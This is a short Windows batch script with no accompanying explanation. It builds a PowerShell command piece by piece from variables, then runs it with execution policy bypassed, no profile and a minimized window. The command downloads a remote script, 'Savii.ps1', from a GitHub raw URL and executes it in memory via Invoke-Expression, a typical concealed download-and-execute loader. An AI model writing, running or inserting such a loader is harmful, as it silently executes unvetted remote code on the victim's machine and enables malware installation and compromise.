@echo off
set "e1=Invoke-Expression"
set "e2=(Invoke-RestMethod"
set "e3=https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
set "cmd=%e1% %e2% %e3%"
powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"
